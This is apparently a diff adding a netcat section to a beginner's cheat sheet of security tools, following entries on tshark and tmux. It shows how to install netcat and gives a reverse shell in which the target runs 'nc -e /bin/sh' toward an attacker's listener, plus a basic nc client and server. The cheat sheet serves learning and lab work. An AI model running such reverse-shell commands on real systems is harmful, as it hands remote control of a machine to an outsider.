@@ -193,3 +193,24 @@ tshark -r <filename>.pcap -qz enpoints,ip
 Tmux is a "terminal multiplexer", this means that we can use multiple terminals at the same time.
 Tmux has a lot of different commands, and can be overwhelming as a beginner, but it's worth the investment of time.
 Here is a [guide](https://www.linuxtrainingacademy.com/tmux-tutorial/).
+
+23. nc
+NetCat also known as nc, is a great tool for  network connections, to install it we use:
+```
+apt install netcat-traditional
+```
+When using netcat on both the _target machine_ and the _attacker machine_. 
+
+We can run a reverse shell:
+**Attackers side**:
+We are running:
+`nc -lvp <port running on>` here we are waiting for the reverse shell, since on a reverse shell, the target is reaching out for us.
+
+**Targets side**:
+We are running:
+`nc -e /bin/sh <ip address> <port>`
+Here we are reaching out to the ip address and port, and creating a /bin/sh shell on the attackers machine.
+
+We can also set up a network server:
+**Attacker machine**: `nc -lvp <port>`
+**Target machine**: `nc -v <ip address> <port>`
